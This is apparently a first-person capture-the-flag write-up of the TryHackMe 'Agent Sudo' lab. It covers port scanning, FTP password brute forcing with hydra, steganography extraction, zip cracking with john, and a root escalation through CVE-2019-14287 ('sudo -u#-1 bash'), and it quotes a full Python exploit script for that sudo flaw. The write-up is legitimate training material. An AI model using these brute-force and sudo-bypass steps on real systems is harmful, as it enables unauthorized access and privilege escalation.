---
title: AGENT SUDO
description: AGENT SUDO
---

Difficulty: Easy

![image.png](../../../assets/AGENTSUDO/image.png)

**Information Gathering Phase**

**Nmap**

```python
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http?   syn-ack
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Found 3 ports open

**Web Enumeration** 

When I check the web page, this is the message that I got.

The message is from Agent R

```jsx
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```

I changed the User-Agent to R to check if there is any message here.

```cpp
┌──(kali㉿kali)-[~/Downloads]
└─$ curl http://10.10.161.189/ -A R   
What are you doing! Are you one of the 25 employees? If not,
 I going to report this incident
<!DocType html>
<html>
<head>
        <title>Annoucement</title>
</head>

<body>
<p>
        Dear agents,
        <br><br>
        Use your own <b>codename</b> as user-agent to access the site.
        <br><br>
        From,<br>
        Agent R
</p>
</body>
</html>
```

Now I am lost. What should I do now.

When I see the hint it says try user-agent “C”, I got the following:

```cpp
┌──(kali㉿kali)-[~/Downloads]
└─$ curl http://10.10.128.229/ -A C -L
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP.
Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
```

So, now we have username “chris” and it is informing that the password is weak. 

Time to brute force the password. 

```cpp
┌──(kali㉿kali)-[~/Downloads]
└─$ hydra -l chris -P rockyou.txt 10.10.161.189 ftp
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-30 11:47:04
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.161.189:21/
[STATUS] 34.00 tries/min, 34 tries in 00:01h, 14344377 to do in 7031:34h, 4 active  
[STATUS] 37.00 tries/min, 111 tries in 00:03h, 14344300 to do in 6461:24h, 4 active                                                             
crystal[STATUS] 19.57 tries/min, 137 tries in 00:07h, 14344278 to do in 12215:20h, 1 active
[STATUS] 12.40 tries/min, 186 tries in 00:15h, 14344229 to do in 19279:53h, 1 active
[21][ftp] host: 10.10.161.189   login: chris   password: crystal      
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-30 12:11:48 
```

I used hydra to brute force the password. It took few minutes to find the password.

Lets see what we got in ftp service.

```cpp
┌──(kali㉿kali)-[~/Downloads]
└─$ ftp 10.10.161.189
Connected to 10.10.161.189.
220 (vsFTPd 3.0.3)
Name (10.10.161.189:kali): chris
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||22424|)
get150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
229 Entering Extended Passive Mode (|||46229|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |********************|   217        2.95 MiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (0.29 KiB/s)
ftp> get cutie.png
local: cutie.png remote: cutie.png
229 Entering Extended Passive Mode (|||6888|)
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
100% |********************| 34842       65.15 KiB/s    00:00 ETA
226 Transfer complete.
34842 bytes received in 00:01 (32.77 KiB/s)
ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
229 Entering Extended Passive Mode (|||28987|)
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
100% |********************| 33143       22.61 KiB/s    00:00 ETA
226 Transfer complete.
33143 bytes received in 00:01 (16.59 KiB/s)
```

Got some files I downloaded all the files.

One of the file contain message from Agent C to Agent J. 

```cpp
                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture
inside your directory. Your login password is somehow stored in the fake
picture. It shouldn't be a problem for you.

From,
Agent C
```

It says login password is stored in the fake picture.

This concept of hiding information in files is called **"steganography"**. I search for it and got “binwalk” and “steghide” to play with it.

```cpp
┌──(kali㉿kali)-[~/Downloads]
└─$ binwalk -e cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression

WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

got some files. Lets see what we got there. I could be password.

![image.png](../../../assets/AGENTSUDO/image%201.png)

Need password to open the file. 

```cpp
┌──(kali㉿kali)-[~/Downloads]
└─$ john yo --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:00 DONE (2024-09-30 21:49) 1.351g/s 33210p/s 33210c/s 33210C/s michael!..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Cracked!!!  Lets see what we got!

```cpp
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
 
```

What is this now. Username?? or password?? It could be password!!

![image.png](../../../assets/AGENTSUDO/image%202.png)

we got message.txt file. 

```cpp
┌──(kali㉿kali)-[~/Downloads]
└─$ cat message.txt 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this
 password for you.

Your buddy,
chris
```

it message to james from chris. haha It have provided password too with username “james”.

we have seen that port 22 is open?

![image.png](../../../assets/AGENTSUDO/image%203.png)

We get into james and got user.txt 

what is that now ?? Alien_autospy.jpg

![image.png](../../../assets/AGENTSUDO/image%204.png)

Got nothing to do with this picture!

**Privilege Escalation**

```cpp
james@agent-sudo:~$ sudo -l                                       
[sudo] password for james:                                        
Matching Defaults entries for james on agent-sudo:                
    env_reset, mail_badpass,                                      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

I checked for the sudo version and got: **"Sudo version 1.8.21p2"**

I looked up, and there is a privelege escalation vulnerability for this version of sudo: [CVE-2019-14287](https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability)

So, I ran the following command:

```jsx
sudo -u#-1 bash
```

```cpp
# Exploit Title : sudo 1.8.27 - Security Bypass
# Date : 2019-10-15
# Original Author: Joe Vennix
# Exploit Author : Mohin Paramasivam (Shad0wQu35t)
# Version : Sudo <1.8.28
# Tested on Linux
# Credit : Joe Vennix from Apple Information Security found and analyzed the bug
# Fix : The bug is fixed in sudo 1.8.28
# CVE : 2019-14287

'''Check for the user sudo permissions

sudo -l 

User hacker may run the following commands on kali:
    (ALL, !root) /bin/bash

So user hacker can't run /bin/bash as root (!root)

User hacker sudo privilege in /etc/sudoers

# User privilege specification
root    ALL=(ALL:ALL) ALL

hacker ALL=(ALL,!root) /bin/bash

With ALL specified, user hacker can run the binary /bin/bash as any user

EXPLOIT: 

sudo -u#-1 /bin/bash

Example : 

hacker@kali:~$ sudo -u#-1 /bin/bash
root@kali:/home/hacker# id
uid=0(root) gid=1000(hacker) groups=1000(hacker)
root@kali:/home/hacker#

Description :
Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
-u#-1 returns as 0 which is root's id

and /bin/bash is executed with root permission
Proof of Concept Code :

How to use :
python3 sudo_exploit.py

'''
#!/usr/bin/python3

import os

#Get current username

username = input("Enter current username :")

#check which binary the user can run with sudo

os.system("sudo -l > priv")

os.system("cat priv | grep 'ALL' | cut -d ')' -f 2 > binary")

binary_file = open("binary")

binary= binary_file.read()

#execute sudo exploit

print("Lets hope it works")

os.system("sudo -u#-1 "+ binary)
```

```cpp
root@agent-sudo:/root# cat root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```

Got it!!

**Final Thought**

This room was fun. I came across new thing like even we can hide file in the picture. I would like to recommend this room to a person who have just started doing CTF because for every task there is a hint given, so that we can follow it. That’s what beginner do.. 

 

![bob-anakshie.gif](../../../assets/AGENTSUDO/bob-anakshie.gif)
